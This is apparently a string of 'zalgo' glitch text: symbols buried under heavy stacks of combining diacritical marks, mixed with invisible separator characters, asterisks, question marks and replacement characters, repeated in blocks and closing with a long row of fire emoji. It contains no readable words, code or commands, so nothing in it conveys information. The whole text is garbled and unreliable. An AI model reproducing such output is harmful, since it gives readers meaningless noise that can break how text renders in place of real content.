̛͍̘̤̩̳̙̎̽̐̈̔̔͂̒̈́͑͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥